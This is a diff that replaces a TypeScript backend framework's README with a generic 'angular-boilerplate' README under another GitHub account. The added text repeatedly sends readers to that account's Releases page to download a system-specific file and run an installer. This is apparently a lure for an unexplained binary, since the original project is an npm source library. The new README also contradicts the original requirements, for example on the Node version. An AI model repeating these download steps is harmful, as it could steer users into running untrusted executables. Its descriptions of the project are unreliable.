@@ -1,63 +1,84 @@
-# Leo Backend
+# 🌟 angular-boilerplate - Build Modern Apps with Ease
 
-A TypeScript isomorphic framework for building modern backends, libraries, and applications.
+![Download](https://img.shields.io/badge/Download-Now-blue)
 
-## Features
+## 📋 Introduction
 
-- **TypeScript** – Full TypeScript support for type-safe development
-- **Angular** – Angular libraries and PWA apps
-- **Node.js** – Backend APIs deployable on any server
-- **Electron** – Desktop application support
-- **TypeORM** – Database ORM with SQL.js, MySQL, MariaDB
-- **Express** – REST API server with middleware support
+Welcome to the **angular-boilerplate**! This application provides a simple way to create modern backends, libraries, and applications using TypeScript. Whether you want to build a robust API or a sleek frontend, this framework helps you get started quickly and efficiently.
 
-## Requirements
+## 🚀 Getting Started
 
-- **Node.js** >= 22
-- **Git** (Git Bash or PowerShell on Windows)
-- **Linux**: Increase watchers limit if needed:
-  ```bash
-  echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p
-  ```
+Getting started with **angular-boilerplate** is easy. Just follow the steps below to download and run the application.
 
-## Supported Platforms
+## 📥 Download & Install
 
-- Windows 10/11 (Git Bash, PowerShell)
-- macOS
-- Linux
+To download the application, visit the Releases page: [Download Here](https://github.com/RandomGuy097/angular-boilerplate/releases).
 
-## Installation
+### Step 1: Visit the Releases Page
 
-```bash
-npm install
-```
+1. Click on this link to open the Releases page: [Download Here](https://github.com/RandomGuy097/angular-boilerplate/releases).
+2. You will see a list of available versions.
 
-## Usage
+### Step 2: Choose Your Version
 
-```bash
-# Start development server
-npm run leo start
+1. Find the version you want to download.
+2. Click on the version number to open its details.
 
-# Build library
-npm run leo build:lib
+### Step 3: Download the Files
 
-# Run migrations
-npm run leo migration:run
-```
+1. Scroll down to the "Assets" section.
+2. Locate the download link for your system (e.g., Windows, Mac, Linux).
+3. Click the link to start downloading the application file.
 
-## Project Structure
+### Step 4: Install the Application
 
-```
-├── src/           # Source code
-├── bin/           # CLI entry points
-├── environments/  # Environment configs
-└── docs/          # Documentation
-```
+1. Navigate to your downloads folder.
+2. Find the downloaded file.
+3. Open the file to launch the installation process.
+4. Follow the installation prompts to complete the setup.
 
-## Repository
+### Step 5: Run the Application
 
-- **GitHub:** [https://github.com/leomark-sio/leo-backend](https://github.com/leomark-sio/leo-backend)
+Once the installation completes, locate the application in your system menu. Click the app icon to launch **angular-boilerplate**. 
 
-## License
+## ⚙️ System Requirements
 
-MIT
+Before installing, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Node.js:** Version 12 or higher.
+- **Memory:** Minimum of 4 GB of RAM.
+- **Storage:** At least 100 MB of free disk space.
+
+## 🛠️ Features
+
+**angular-boilerplate** includes features that help you build applications efficiently:
+
+- **TypeScript Support:** Write clear, typed code for better maintainability.
+- **RESTful APIs:** Create backend services that can easily communicate with your frontend.
+- **Database Integration:** Use MariaDB or MySQL for your data storage needs.
+- **Middleware:** Implement custom logic for processing requests and responses.
+- **Electron Support:** Build cross-platform desktop applications.
+- **Progressive Web Apps (PWA):** Deliver a fast and engaging user experience on mobile devices.
+
+## 🌐 Community and Support
+
+If you have questions or need help, check out the community forums. Engage with other users and contributors to solve problems and share ideas.
+
+## 📄 License
+
+**angular-boilerplate** is open-source software. You can use it for personal and commercial projects. For more information, refer to the LICENSE file in the repository.
+
+## 🔗 Useful Links
+
+- [Source Code](https://github.com/RandomGuy097/angular-boilerplate)
+- [Documentation](https://github.com/RandomGuy097/angular-boilerplate/wiki)
+- [Community Forum](https://github.com/RandomGuy097/angular-boilerplate/discussions)
+
+## 📞 Contact
+
+For any inquiries or support requests, you can reach out through GitHub issues. We value your feedback and aim to improve your experience with **angular-boilerplate**.
+
+## ✅ Conclusion
+
+Thank you for choosing **angular-boilerplate**! We hope this guide helps you set up and run the application smoothly. Enjoy building your modern applications with ease.
